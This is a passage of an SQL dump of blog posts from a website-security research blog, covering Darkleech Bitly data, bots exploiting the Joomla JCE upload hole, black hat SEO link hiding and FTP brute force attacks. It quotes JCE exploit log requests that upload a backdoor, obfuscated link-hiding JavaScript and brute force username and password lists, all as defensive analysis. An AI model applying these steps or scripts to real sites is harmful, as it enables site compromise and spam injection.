INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (215, 'Working With the Darkleech Bitly Data', 'unmask', '10 Feb 14', 'Loading site search ...          			                Working With the Darkleech Bitly Data                          10 Feb 14   Filed in General                Data Driven Security took the time to analyze the raw data that I published in my recent post on Sucuri blog about how I used Bitly data to understand the scale of the Darkleech infection.In their article, they have a few questions about data formats, meaning of certain fields and some inconsistencies, so I’ll try to answer their questions here and explain how I worked with the data.So I needed to get information about all the links of the “grantdad” bitly account.I checked the API and somehow missed the “link_history” API request (it was the first time I worked with the bitly API), so I decided to screenscrape the web pages where bitly listed the links creaded by grantdad. 1,000 pages with 10 links on each. Since pages didn’t contain all the information I needed I only collected the short links so that I could use them later in API calls to get more detailed information about each of them.As you can see I was limited with the 10,000 links that bitly made available via their web interface. Not sure if I could get more links via that link_history API. Right now it returns “ACCOUNT_SUSPENDED” and when it was not suspended, API calls for known links beyond those 10,000 produced various errors.When I compiled my list of 10,000 links I used the following API calls to get information about each of the links:Referring domainsAPI:link/referring_domains — for each link, it returned a list of domains referring traffic to this link (in our case sites, containing the iframes) along with the number of clicks from each domain. This helped me compile this list of iframe loads per domain: http://pastebin.com/HYaY2yMb. Then I tried to resolve each of the domain names and created this list of infected domains per IP address: http://pastebin.com/Gxr51Nc1.I also used this API call to get number of iframe loads for each bitly link.InfoAPI:link/info – this gave me timestamps of the links and their long URLs (the rest information was not interesting for my research). Unfortunately, this particular API call is poorly documented so I can only guess what this timestamp mean. It is actually called “indexed“. But I guess it’s the time when the link was created. It is definiteley not the time of the first click because there were no registered clicks for many of the links. As a result, I compiled these datasets:http://pastebin.com/UmkDZZp0http://pastebin.com/w7Kq3ybV ,which contain tab separated values of “bitly link id”, “timestamp”, “# of clicks/iframe loads”, and “long URL”.At that point, I already had the number of iframe loads from the previous step (“link/referring_domains“). Then, for readability, I converted the numeric timestamp using this Python function datetime.datetime.fromtimestamp(). However, you can notice that the second dataset (for January 28th) has a different date format. Instead of “2014-01-25 19:10:07” it uses “Jan 28 23:10:19“. Why? Because of pastebin.com. Because it doesn’t allow unregistered users to post more than 500Kb of data (I deliberately post such data as a guest). Removing the year from the date allowed me to save 4 bytes on each row and fit the dataset in 500Kb.Actually this 500Kb limit is the reason why I have separate pastebins for each date and only specify bitly ids instead of the full bitly links.CountriesAnd finally, API:link/countries – for each link, it returned a list of countries referring traffic to this link along with the number of clicks from those countries. This helped me compile this list of iframe loads per country http://pastebin.com/SZJMw3vx.The last dataset Feb 4-5When I wrote my blogpost on February 5th, I noticed that there were new links available on the Bitly.com grantdad acount page. I began to browse pages of his links and figured that most of the links were the same (Jan 25 and 28) but around 1,700 of them were new (late February 4th and the beginning of February 5th). I immediately repeated the same procedure that included screenscraping, and 3 API calls for each new bitly link. After that I created this new dataset http://pastebin.com/YecHzQ1W and updated the rest datasets (domains, countries, etc).Some more detailsIf you check the total numbers in these two datasets (domains) http://pastebin.com/HYaY2yMb and (countries) http://pastebin.com/SZJMw3vx you’ll see the different in total number of iframe loads: 87152 and 87269. I don’t know why. I used the same links just different API calls (referring_domains and countries) and the totals are supposed to be the same. I didn’t save the “per link” data so can’t tell exactly whether it was my error or the bitly API produces slightly inconsistent results. Anyway, the difference is neglectable for my calculations and doesn’t affect the estimations (given that I tried to underestimate when in doubt ).I didn’t check for duplicates that guys from Data Driven security found in my datasets. They must have to do with my screenscraper and the way that Bitly.com displays links in user accounts. The total number of scraped links matched the number of links that Bitly reported for the user. The extra 121 clicks that these duplicates are responsible for are so close to the 117 difference that I mentioned above so I wonder if these numbers somehow connected? Anyway, this shouldn’t affect the accuracy of the estimates either.Building the geo distribution mapFor the map, I used the Geochart from Google visualization. Since the difference in numbers of clicks for the top 3 countries and the lower half of the list was 3 orders of magnitude, I had to re-scale the data so that we could still see the difference between countries with 50 iframe loads and 2 iframe loads.. I used a square of a natural logarithm for thatMath.pow( Math.round( Math.log(i)), 2)This gave me a nice distribution from 0 to 100 and the below map.IFrame Load Geo DistributionSpeculation on the link generationAfter checking the link creation per minute-of-an-hour distribution, Bob Rudis wondered:This is either the world’s most inconsistent (or crafty) cron-job or grantdad like to press ↑ + ENTER alot.I guess, it was neither cron-job nor manual link creation. I think the [bitly] links were created on-demand. So if someone loads a page and Darkleech needs to inject an iframe then it (or rather the server it works with) generates a new bitly link. Given that this malware may lurk on a server, there may be time periods when no malicious code is being injection into any web pages across all the infected servers. At the same time, the bitly links with zero clicks may refer to page loads by various bots (including our own) when the malicious code is injected but the iframe is never loaded. On the other hand, the volume of bitly links with 0 clicks (~35%) suggests that there might really more complex link generation mechanism than a simple “on-demand” approach.Anyway, that’s great when people double check our data and try to find new interesting patterns there. Make sure to let me know (here or on the Sucuri blog) if you find more patterns and inconsistencies, or have any comments on how the Darkleech works.Related posts:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsBety.php Hack. Part 2. Black Hats in Action.Introduction to Website Parasites                                                                                  Tags: Bitly Darkleech data statistics                                                    			                                            « Invasion of JCE Bots                Google -> Doorway -> Google -> Spam »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2014/02/10/working-with-the-darkleech-bitly-data/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (216, 'Invasion of JCE Bots', 'unmask', '27 Jan 14', 'Loading site search ...          			                Invasion of JCE Bots                          27 Jan 14   Filed in Website exploits                Joomla has been one of the most popular CMS for a long time.  It powers a huge number of sites.  That’s great! The flip side of this fact is Joomla has been very popular for a long time and there are still very many sites that use older versions of Joomla as well as older version of Joomla components. For example, the 1.5.x branch of Joomla (2008-2010) still has a noticeable share in live Joomla sites.Old versions may work well for your site but they have multiple well known security holes, so they are the low hanging fruit for hackers. Let me show this using a real world example.JCE attackThere is a JCE component — a fancy content editor that can be found almost on every Joomla site. It has a well known security hole that allows anyone to upload arbitrary files to a server.You can easily find a working exploit code for this vulnerability.  What it does is:Checks whether a vulnerable version of JCE is installed (2.0.11, 2.0.12, 2.0.13, 2.0.14, 2.0.15, 1.5.7.10, 1.5.7.11, 1.5.7.12, 1.5.7.13, 1.5.7.14)Exploits the bug in the JCE image manager to upload a PHP file with a .gif extenstion to the images/stories directoryThen uses a JSON command to rename the .gif file to *.php.Now you have a backdoor on a server and can do whatever you want with the site.This is how this attack looks in logs (real example):197.205.70.37 - - [23/Jan/2014:16:46:54 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b HTTP/1.0\" 200 302 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20 HTTP/1.0\" 200 329 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"GET /images/stories/3xp.php HTTP/1.0\" 200 465 \"-\" \"BOT/0.1 (BOT for JCE)\"As I mentioned, JCE is a very popular component and there are still many sites that use old versions of this component. No wonder, hackers are scanning the Internet for such vulnerable sites.  They reworked the exploit code for use in their automated tools that relentlessly test millions of sites, one by another.  These days, I can find multiple requests with the “BOT/0.1 (BOT for JCE)” User-Agent string in logs of almost every site that I check, even in logs of sites that have never had Joomla installed.I’d like to share some interesting statistics of a real site that had been hacked using this JCE hole and then was being routinely reinfected every day.7,409 requests with the User-Agent “BOT/0.1 (BOT for JCE)” that came from 785 different IPs during the period of Dec 24th – Jan 24th (one month)239 requests from 51 unique IP addresses during the last 24 hours4 independent (uploaded different types of backdoors) successful infections during one day.plus, multiple tests for other vulnerabilities.To webmastersAs you can see,  this is something that you can’t neglect or consider an insignificant threat.  It’s silly to hope that hackers won’t find your site. Today hackers have resources to spider the Internet almost as efficiently as Google just about 10 years ago, so there is almost no chance your site will stay unnoticed. The only way to prevent the hacks is to be proactive:  keep all software up-to-date and harden your sites.In case of this particular JCE attack:Make sure to upgrade your Joomla site to the most current version.Upgrade JCE to the latest version. You can find download packages for all the three branches of Joomla here.Protect all file upload directories and all directories that shouldn’t contain .php files. For example, place the following .htaccess file there to prevent execution of PHP files:<Files *.php>deny from all</Files>Try blocking requests with the “BOT/0.1 (BOT for JCE)” User-Agent string.  Of course, this shouldn’t be considered as a real protection. Hackers can change the User-Agent string to whatever they want. But it can help keep some dumb annoying bots away from your site.If, for some reason, you can’t upgrade your site at this moment, consider placing it behind a website firewall that will block any malicious traffic before it reaches your server.  This is something that we call virtual patching in Sucuri CloudProxy.                                                                                  Tags: exploit JCE Joomla                                                    			                                            « Reporting Suspicious Styles                Working With the Darkleech Bitly Data »            			    Reader\'s Comments (8)       	        			        			Jim Walker | 28 Jan 2014 5:47 pm 						Nicely done!The JCI component “problem” and has been a thorn in the Joomla communities side for years.I would go so far as to say that 1/2 of all of the hacked Joomla installations I’m asked to repair are JCE exploit related.As mentioned, simply adding the .htaccess “no execute php” file within the images/stories directory generally does the trick, though upgrading is always best.Personally, for this particular exploit, I prefer the below in my .htaccess file:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shI like how you linked out to Google and known JCE exploits as well.A quality post top to bottom. Kudos!                   			        			Denis | 28 Jan 2014 7:12 pm 						Thanks Jim,That “text/plain” handler also does the trick and covers a broader range of attacks.I don’t want to link directly to exploits. But if you want to find the information, this Google search is enough. At the same time, if there is some new JCE file upload vulnerability, this search will show it too, so the link will remain fresh and useful.                   			        			machineX | 19 Sep 2014 9:05 am 						I just seen it in some logs for the second time. We do not use joomla. But I think your .htaccess code is very useful in preventative measures for sites overall.                   			        			Brian M | 20 Feb 2014 3:10 pm 						I’m curious if you would have any more information on exactly what is allowing the exploit to work? I understand it’s an exploit in code which was in an old version of Joomla, but my vBulletin sites are apparently being exploited by this Bot for JCE script. I do not have any pieces of Joomla installed on the server – at least, not that I’m aware of. Thankfully Microsoft Security Essentials is catching the backdoor/shell script being uploaded to the site and is removing it before they can use it, but it scares me that they’re able to upload the file to my site in the first place. I’ve tried to get help from vBulletin but they brush it off as not being on their end.                   			        			Denis | 11 Jun 2014 5:13 pm 						In case of Joomla JCE, it just uses a bug to upload a PHP file as a .gof and then change it’s extension to .php.If you don’t have Joomla, then you might see multiple attempts to scan your site for that JCE security hole. They do it on every site. If they find it – they exploit it, if not they move on to the next site. So what you are seeing is probably just attack attempts, not successful attacks. On the other hand, if hackers find vulnerabilities in vBulletin or any other type of site, they’ll most likely upload pretty much the same backdoors as if it was Joomla.vBulletin may be slightly different as most of it’s malware lives in its database.                   			        			JCE Joomla Extension Attacks in the Wild | Sucuri Blog | 26 Mar 2014 8:11 pm 						[…] Unmask: Invasion of JCE Bots […]                   			        			catalina | 30 Mar 2014 6:23 am 						If I understood, I have to open my .htaccess file and insert these lines:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shThats it?Which are the “collateral effects” of this?Thanks in advanceCatalina                   			        			Denis | 11 Jun 2014 5:16 pm 						This code makes web server treat such files as regular text files. I.e. instead of executing any code in them, it will just display their content in a browser as if they were plain text files.The side effect is you won’t be able to have executable scripts in those directories. But it’s the point of this trick – place it to the directories that shouldn’t have executable files', '', 'http://blog.unmaskparasites.com/2014/01/27/invasion-of-jce-bots/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (217, 'Reporting Suspicious Styles', 'unmask', '22 Nov 13', 'Loading site search ...          			                Reporting Suspicious Styles                          22 Nov 13   Filed in Unmask Parasites                Back in 2008, the very first task that I created Unmask Parasites for was scanning web pages for hidden links.I read an article about thousands of WordPress blogs being stuffed with dozens of invisible spammy links. I had a self-hosted WordPress blog too and that article made me think if there was some easy way to figure out whether my blog was hacked, something less laborious than manually examining the HTML code link by link. So I decided to create a tool that would show all domains that my web pages linked to highlighting those of them that had “invisible” styles. This approach has proved to be very efficient in identifying black hat SEO hacks. In most cases, a glance is enough to spot such problems.It works well even when the tool doesn’t highlight links as “hidden” (either because the “hiding rule” was not detected or because it scanned the “cloaked” page created specifically for search engines). You can still see the links that clearly don’t belong to your site, which tells you that something’s wrong.However, looking for suspicious links is not the bullet-proof method for detecting spam injection issues. For example, in my yesterday’s post on Sucuri blog, I wrote about fake WordPress plugins that used to injects spammy links and a JavaScript code into web pages. However, at the moment, they inject some hidden spammy auto-generated text that doesn’t have any links.You can use this Google query to reveal affected sites [cigarettes AND (“3200 unhealthy” OR “3300 hazardous”)]I don’t know why they do it, but webmasters should definitely be warned about such injections because it’s a sign of a problem that should be fixed as soon as possible. This is actually more serious than just a factor that can potentially affect site’s search ranking. Those fake plugins fetch the spammy content from remote servers and inject it into blog pages on the fly. This means that hackers can change it any time and the same moment the new spammy block will be injected into all compromised sites. Or it can be a malicious block, which makes things more serious as it will affect all visitors to those sites too.Unfortunately, such injections were not reported by Unmask Parasites since there were no links in the spammy block. After thinking about the problem, I decided that Unmask Parasites should also report pure HTML tricks such as that clip:rect style trick that hackers use to hide their injections.So , starting this week, you may see the “Suspicious Styles” section in Unmask Parasites reports.In this section, you will see excerpts of the style definitions that Unmask Parasites considers suspicious. If you see it in your site reports, then you should check the HTML code of your pages and figure out whether that style is a normal part of your pages or it was added there to hide something illicit.Note, if you can’t find such code in your web pages, it doesn’t mean it is not there. The code injection can be conditional, and server files may fetch it from a remote location (as in this case with fake WordPress plugins), or it can be encrypted. Just remember that Unmask Parasites works in real time (some results may be cached for up to an hour) and if it reports something, then you can be sure it was on a web page at the moment of scanning.To Unmask Parasites usersIf you like Unmask Parasites and want to help improve it, you can inform me about interesting tricks that hackers use to hide injected content Or send me examples of infected web pages where Unmask Parasites doesn’t report any problems.Thanks!Related posts:Unmasking “Canonical” HacksRich Snippets in Black Hat SEOIntroduction to Website Parasites                                                                                  Tags: black hat seo hidden links spam                                                    			                                            « Unmask Parasites joins Sucuri                Invasion of JCE Bots »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/11/22/reporting-suspicious-styles-2/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (218, 'Unmask Parasites joins Sucuri', 'unmask', '20 Sep 13', 'Loading site search ...          			                Unmask Parasites joins Sucuri                          20 Sep 13   Filed in Unmask Parasites                It’s official. This week Unmask Parasites joins Sucuri!Since July of 2008 when I released the first public version, Unmask Parasites was a “one man project” and it worked fine for me most of the time. I did everything myself from server setup to site development, from web attack investigations to blogging here. During these years Unmask Parasites became quite noticeable both within webmasters and Internet security community. And I always tried to meet their expectations providing a tool that could reveal various obscure website security issues and sharing information on how and why websites get hacked, and what can be done to prevent it.When Sucuri approached me and asked if I wanted to join their team as a malware researcher, I didn’t think much. I’ve been watching this company since 2010 and knew how much we had in common in our approach to Internet security. We both focus on helping site owners to detect security problems and protect their sites. We do our best to educate webmasters about things that hackers do with compromised websites — unmasking their dirty tricks is an important part of our work. In 2011 we established good relationship and began to help each other by sharing our information about ongoing massive attacks. Now Sucuri has grown to one of the leading companies in its field and makes a significant impact on how many thousands of site owners protect their sites. It’s an honor for me to join this company and the team of professionals that I know for so long time.I guess you wonder what will happen to Unmask Parasites scanner and this blog? They are here to stay! I will still be responsible for Unmask Parasites and continue to improve it and publish my blogposts here. Even better: now that I’m with Sucuri, I will have access to large volumes of data from their tools and support team (something that I really missed during the last five years), which will definitely facilitate my investigations, and, in turn, improve the quality of Unmask Parasites scanner and Sucuri own tools.For additional information check the Sucuri’s announcement.Let’s unmask parasites!Related posts:Let’s Unmask Parasites1 Million Pages Checked by Unmask Parasites!Unmask Parasites. A Year of Blogging.                                                                                  Tags: Sucuri                                                    			                                            « Analyzing [Buy Cialis] Search Results                Reporting Suspicious Styles »            			    Reader\'s Comments (2)       	        			        			Jackie McBride | 21 Sep 2013 3:36 pm 						Denis, I cannot think of anyone more deserving than you of this opportunity. Hearty congratulations & many blessings in your new venture as you go forward! & Sucuri better realize how damn lucky they are lol. From the sound of the announcement, it appears they do. Again, congratulations!                   			        			Sucuri Expands Research Efforts with Acquisition of Unmask Parasites | Sucuri Blog | 15 Sep 2014 11:50 pm 						[…] Unmask Parasites blog post […]', '', 'http://blog.unmaskparasites.com/2013/09/20/unmask-parasites-joins-sucuri/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (219, 'Analyzing [Buy Cialis] Search Results', 'unmask', '21 Aug 13', 'Loading site search ...          			                Analyzing [Buy Cialis] Search Results                          21 Aug 13   Filed in General                A few days ago I was updating the spammy word highlighting functionality  in Unmask Parasites results and needed to test the changes on real websites. To find hacked websites with spammy content I would normally google for [viagra] or [cialis], which are arguably the most targeted keywords used in black hat SEO hacks. However after the Google’s June update in how they rank web pages for spammy queries, I didn’t have much expectation of seeing hacked sites on the first page of search results for my usual [buy cialis] query and was ready to check a few more pages.We just started a new ranking update today for some spammy queries. See 2:30-3:10 of this video: http://t.co/KOMozoc3lo #smx— Matt Cutts (@mattcutts) June 11, 2013Indeed, for queries like [payday loans] I can see quite relevant results on the first three pages. All sites are specialized and don’t look like doorways on hacked sites. That’s really good. For [viagra] I found only one result on the first page pointing to a doorway on a hacked site. Still good.However, when I entered a really spammy combination [buy viagra], the search results were less than optimal — 5 out of 10 led to hacked sites. And at least 2 out of the rest 5 specialized sites were promoted using hidden links on hacked sites. Not good. And the worst results (although ideal for testing my update) were for the [buy cialis] query — 100% of results on the first page (10 out of 10) led to doorways on hacked sites or simply spammy web pages. Not a single result from websites that really have anything to do with cialis.Results analysisHere is the breakdown of the first 10 results (links go to real time Unmask Parasites reports for these pages and at the moment of writing they all reveal spammy content. However this may change over time):www.epmonthly .com/advertise/ — doorway on a hacked sitewerenotsorry .com/ — strange spammy site with a rubbish content like this “The car buy cialis in your car is the ultimate well source of electrical amazing power in your car.“incose .org/dom/ — doorway on a hacked site.www.deercrash .org/buy/cialis/online/ — doorway on a hacked sitejon-odell .com/?p=54 — doorway on a hacked sitewww.goodgrief .org .au/Cialis/ — doorway on a hacked sitewww.asm .wisc .edu/buy-cialis — doorway on a hacked sitewww.mhfa .com .au/cms/finance-home/ — doorway on a hacked sitewww .plowtoplate .org/library/51.html — doorway on a hacked sitejohn-leung .com/?p=16 — doorway on a hacked siteOver the course of the past week the results slightly fluctuated and sometimes I saw the following links on the first SERP.www.enconline .com/buycialisonline/ — doorway on a hacked sitewww.bbs-usa .com/online/ — doorway on a hacked sitewww.fabrand .com/buycialis/ — doorway on a hacked sitewww.philiptusa .com/streak/ — doorway on a hacked sitewww.clarkart.edu/authman/ — doorway on a hacked sitewww.gvhc.org/temp/index.html — doorway on a hacked sitewww.cialis-no-prescriptions.com — specialized site, but its backlink profile include many hacked sites with injected hidden links (e.g. www.aauw-nys.org)tadalafilcheap .ca/buy-cialis-online – another specialized site with a very poor backlink profile (mostly spammy off-topic forum posts).Out of 18 links that I encountered on the first page for [buy cialis] 15 point to doorways on hacked sites, 1 to a site with unreadable machine-generated text (still not sure whether it’s some SEO experiment or a backdoor with a tricky search traffic processing procedure) and 2 specialized sites relevant to the query but with quite bad backlink profiles. Overall 0% of results that follow Google’s quality guidelines.So the Google’s update for spammy queries doesn’t seem to work as it should at least for some über spammy queries.  It’s sad. And the reason why I’m sad is not that I worry about people who use such queries on Google to buy some counterfeit drugs.  My major concern is this situation justifies the huge number of sites (many thousands) that cyber-criminals hack in order to put a few of their doorways to the top for relevant queries on Google.Behind the scenesThe above 15 hacked sites that I found on the first Google’s SERP are actually only a tip of the iceberg. Each of them is being linked to from many thousands (if not millions) pages from similarly hacked sites. Here you can see a sample list of  sites that link to the above 15 (you might need a specialized tool like Unmask Parasites to see hidden and cloaked links there).Many of the hacked web pages link to more than one doorway page, which maximizes changes that one of them will be finally chosen by Google to be displayed on the first page for one of the many targeted keywords. And at the same time this helps to have a pool of alternative doorways in case some of them will be removed by webmasters or penalized by Google. As a result, the networks of doorways, landing pages and link pages can be very massive. Here you can see a list with just a small part of spammy links (338 unique domains) that can be found  on hacked web pages..gov, .edu and .orgAmong those hacked sites you can find sites of many reputable organizations, which most likely greatly help to rank well on Google. There are many compromised sites of professional associations, universities and even governmental sites, for example (as of August 19th, 2013):www.volunteer.gov/sec/spb.ca.gov/status/www.takepride.gov/index.htmlVolume of spammy backlinksIf you take some of the top results and check their backlink profiles (I used Majestic SEO Site Explorer), you’ll see how many domains can be compromised (or spammed) just in one black hat SEO campaign. And we know that there are many ongoing competing campaigns just for “cialis” search traffic, so you can imaging the overall impact.On the above screenshot you can see that thousands of domains linking to “www .epmonthly .com/advertise/” using various “cialis” keywords.The situation with “www. epmonthly .com/advertise/” is quite interesting. If you google for [“www.epmonthly .com/advertise/”] you’ll see more than a million results pointing to web pages where spammers used automated tools to post spammy links (including this one) in comments, profiles , etc. but failed to verify whether those sites accept the HTML code they were posting (still many sites, while escaping the HTML code, automatically make all URLs clickable, so those spammers finally achive their goal) .Typical black hat SEO tricksIn addition to annoying but pretty harmless comment spamming, forum spamming and creating fake user profiles, black hats massively hack websites with established reputation and turn them into their SEO assets.Spammy linksThe most common use for a hacked site is injecting links pointing to promoted resources (it can be a final landing page, or a doorway, or an intermediary site with links). Here is what such web pages may look like in Unmask Parasites reports:To hide such links from site owners, hackers make them hidden. For example, they can place them in an off-screen <div><div style=\"position:absolute; left:-8745px;\">...spammy links here...</div>Or put them in a normal <div> and add a JavaScript to make this <div> invisible when a browser loads the page<div id=\'hideMe\'> ... spammy links here.... </div><script type=\'text/javascript\'>if(document.getElementById(\'hideMe\') != null){document.getElementById(\'hideMe\').style.visibility = \'hidden\';document.getElementById(\'hideMe\').style.display = \'none\';}</script>The JavaScript can be encrypted.e v a l(function(p,a,c,k,e,d){e=function(c){return(c<a?\"\":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!\'\'.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return\'\\\\w+\'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);return p;}(\'2.1(\\\'0\\\').5.4=\"3\";\',6,6,\'bestlinks|getElementById|document|none|display|style\'.split(\'|\'),0,{}))which translates todocument.getElementById(\'bestlinks\').style.display=\"none\";where “bestlinks” is the id of the <div> with spammy links.Sometimes, encrypted JavaScript can be coupled with dynamic HTML generation of the link container. After decryption it looks like this:document.w ri t e(\'<style><!-- .read {display:none} --></style><address class=\"read\">\');...spammy links here...document.wri te(\'</address>\');Of course, it’s only a client-side representation of the problem. On the server side, it’s rarely this straightforward. Most times it involves obfuscated (usually PHP) code in sneaky places (e.g. themes, plugins, DB, etc.)DoorwaysSites that rely on black hat SEO techniques get penalized by Google soon enough so the can’t expect much search traffic directly from search engines. Instead they try to promote many disposable doorways on other reputable sites that would redirect search traffic to them.The typical approach is to hack a website and use cloaking tricks (generating a specialized version with spammy keywords specifically for search engines while leaving the original content for normal visitors) to make search engines think that its pages are relevant for those spammy queries. E.g. check the title of the “www.epmonthly .com/advertise/” when you visit it in a browser (“Advertise“) and when you check it in Unmask Parasites or in Google’s Cache (“Buy Cialis (Tadalafil) Online – OVERNIGHT Shipping“). Then they add some functionality to distinguish visitors coming from search engines and redirect them to third party sites that pay hackers for such traffic.The redirects may be implemented as .htaccess rules, client-side JavaScript code, or server-side PHP code.Sometimes, instead of using cloaking, hackers simply create a whole spammy section in a subdirectory of a legitimate site, or a standalone doorway page. Example from our cialis search results: www .asm .wisc .edu/buy-cialis .To WebmastersIt might be tricky to determine whether your site fell victim to a black hat SEO hack since hackers do their best to hide evidence from site owners and regular visitors. At the same time antivirus tools won’t help you here since links and redirects (in case they can actually see them) are not considered harmful. Nonetheless, a thoughtful webmaster is always equipped with proper tools and tricks (click here for details) to determine such issues.  They range from specialized Google search queries and and reports in Webmaster Tools to log analysis and server-side integrity control.In addition to the tricks that I described here, you can try to simply load your site with JavaScript turned off. Sometimes this is all it takes to find hidden links whose visibility is controlled by a script.Fighting black hat SEO hacksOf course, site owners are responsible for what happens with their sites, should protect them and clean them up in case of hacks. Doorways on hacked sites would never appear in search results if all webmasters would quickly mitigate such issues.But let’s take a look at this from a different perspective. The main goal of all black hat SEO hacks is to put their doorways to the top on Google for relevant keywords and get a targeted search traffic. And 80% (or even more) massive campaigns target a very narrow set of keywords and their modification. If Google actively monitor the first pages of search results for such keywords and penalize doorways, this could significantly reduce efficacy of such campaigns leaving very few incentive to hack website to put spammy links there. And you don’t have to monitor every possible keyword combination. In my experience, most of them will finally point to the same doorways.I can see Google moving in this direction. The description of the above mentioned ranking algorithm update is very promising. However, as the [buy cialis] query with 0% of relevant search results on the first page shows — a lot should be improved.P.S  Just before posting this article, I checked results for [buy cialis] once more and … surprise!.. found a link to a Wikipedia article about Tadalafil at the 4th position. Wow! Now we have 1 result that doesn’t seem to have anything to do with hacked sites.Related postsCloaking: Think Outside of [Your] BoxCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesMatt Cutts on MalwareIntroduction to Website Parasites                                                                                  Tags: black hat seo cialis cloaking doorway google hidden links spam                                                    			                                            « FTP Brute Force Attacks?                Unmask Parasites joins Sucuri »            			    Reader\'s Comments (2)       	        			        			Colin | 29 Aug 2013 9:27 am 						Hi Dennis,Great analysis, very intersting.I actually contacted the support team at Volunteer.gov a couple of weeks ago, and they were able to remove the hacked pages they were hosted, as well as the other .govs. Great result, was happy at that :)They were hosting a pharma online store, which on investigation was apparently set up to facilitate credit card fraud.Cheers                   			        			Denis | 29 Aug 2013 4:28 pm 						Good!-1 spammy doorway on .gov.Hope Google will also take care of what it returns for certain spammy queries.', '', 'http://blog.unmaskparasites.com/2013/08/21/analyzing-buy-cialis-search-results/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (220, 'FTP Brute Force Attacks?', 'unmask', '26 Jun 13', 'Loading site search ...          			                FTP Brute Force Attacks?                          26 Jun 13   Filed in Website exploits                Hacking websites using FTP access has been one of the most popular attack vectors during the last few year. I can still see many massive site infections done via FTP.In most cases, the first step of such attacks is stealing FTP credentials from local computers of webmasters. Back in 2009, I described how PC malware stole passwords saved in popular FTP clients such as FileZilla, CuteFTP, SmartFTP and many more. This is still a prevailing vector. More exotic password theft methods include keyloggers, FTP traffic sniffing, and stealing user databases of hosting providers who prefer convenience over security and store actual client passwords in plain text or slightly encrypted (instead of storing only hashes of passwords).If you ask regular webmasters how hackers can break into their server via FTP, many of them will answer that hackers could guess the password (hence the need to have hard-to-guess passwords).  Of course, it is hard to guess whatever password at the first attempt, so one might expect to see multiple such attempts (so-called brute force attacks) before a password is cracked and hackers get access to a server. However in real life, I haven’t come across such FTP brute force attacks. Until this month…FTP log analysisI helped a webmaster of a hacked site and, as always, requested recent access and FTP logs to figure out how the site was hacked. The FTP logs clearly showed that someone used a valid username and passwords to upload infected files to the server. This happened several times a day (constant reinfections) from different IPs in different countries. Quite a typical picture.What was untypical were requests that looked like a brute force attack. They came from different IPs and each IP tried to login using many invalid usernames.Choice of usernames in brute force attacks.Here are just a few such sessions and the usernames they tried.198.50.144.128 (Canada		        Montreal		        Ovh Hosting Inc) – 165 login attempts within 70 seconds.second_level_domainsecond_level_domawebmasterwhere <second_level_domain> should be replaced with a real second level domain of a site. E.g. in case of “example.com” the second_level_domain will be example.This attack used the <domain name> as a username and webmaster as an alternative (supposedly default) username, and tried multiple popular passwords from some dictionary.46.29.255.84 (United States		        Lombard		        Deepak Mehta Fie) 	– 9 login attempts at a rate of 2 a second:second_level_domainsecond_level_domainsecond_level_domainsecond_level_domainftpsecond_level_domainrootsecond_level_domainadminsecond_level_domainuserIn this case, the attacker used domain name derivatives (appending words like ftp, admin, user) as usernames,  and the passwords probably matched the usernames (e.g. exampleftp/exampleftp).  A few times they re-tried the same usernames. Probably with slightly different passwords.110.85.113.113,  110.86.165.187, 117.26.118.189, 117.26.119.68 (all from China		        Fuzhou		        Chinanet Fujian Province Network) — 76 login attempts in less than 5 minutes from 4 IPs.00000011111111223312312332112345612345678123456789123654123abc1472581473692222223211233333334444445201314521521555555666666777777888888987654321999999abc123adminadmin111admin123admin222admin321admin333admin444admin555admin666admin777admin888admin999asd123asdasdsecond_level_domainsecond_level_domaintop_level_domaindata123qwe123qwertytestwebweb123wwwwww123zxc123zxcvbnDistributed attackThe last one was obviously a distributed brute force attack where bots from 4 different IPs worked simultaneously and in sync. E.g. one checked “111111” then another checked “112233“, then third checked “222222” and “333333“, then fourth checked “444444“, and so on. Most likely this attack also assumed that some sites may use the same words both as a username and a password.The above three attack took place within 26 hours. Each of them used different approach to choosing usernames and passwords, and they came from different parts of the Internet. It means that there is a real interest in FTP brute force attacks among cyber criminals.Why didn’t I come across such attacks before?After all, brute-force attacks on WordPress and Joomla admin interfaces proved to be very efficient. What makes them so efficient is the fact that there are many millions of WP and Joomla sites out there, and out of those millions there will always be enough sites whose admins were thoughtless enough to choose weak passwords.  That’s why I see hundreds or even thousands of login attempts per day in access logs of almost every WordPress and Joomla site I work with. And unfortunately, some of those site were hacked as a results of the brute force attacks.One might think that FTP is an even better target for brute force attacks since almost every site has FTP access so the number of victims with weak FTP passwords should be substantially larger than the number of WP an Joomla sites with crackable passwords. However it’s not that easy. You should not forget than in case of WP and Joomla, hackers assume that site administrators use the CMS default usernames (admin for WP and administrator for Joomla) so they only need to guess their passwords. But in case of FTP, the username is not known. There is no default FTP username. This is especially true for shared hosting 